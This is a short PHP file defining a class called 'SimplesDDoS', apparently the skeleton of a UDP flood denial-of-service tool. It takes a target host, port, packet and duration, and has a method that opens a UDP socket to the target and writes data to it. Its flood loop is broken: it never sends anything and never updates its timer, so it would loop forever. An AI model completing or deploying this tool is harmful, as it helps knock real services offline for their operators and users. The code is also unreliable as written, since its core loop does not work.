<?php
define('DEFAULT_BYTE',"\x00");

class SimplesDDoS {
  
  private $params = [
    'host' => '',
    'port' => '',
    'packet' => '',
    'time' => '',
    'execution_interval' => '1'
  ];

  public function __construct($params = []) {
    $this->params = $params;
  } 

  public function start() {
    $packets_count = 0;
    $now_time = time();
    $max_execution_time = $now_time + $this->params['time'];

    while ($now_time < $max_execution_time) {
      
      $packets_count++;
    }
  }

  public function generate_udp_connection($host,$port,$output) {
    $fsocket_connection = fsockopen("udp://{$host}", $port, $errno, $errstr, 30);
    if ($fsocket_connection) {
      if (@fwrite($fsocket_connection, $output)) {
        //sending data success
      } else {
        //sending data error
      }
      fclose($fsocket_connection);
    } else {
      //socket connection error
    }

  }
}

?>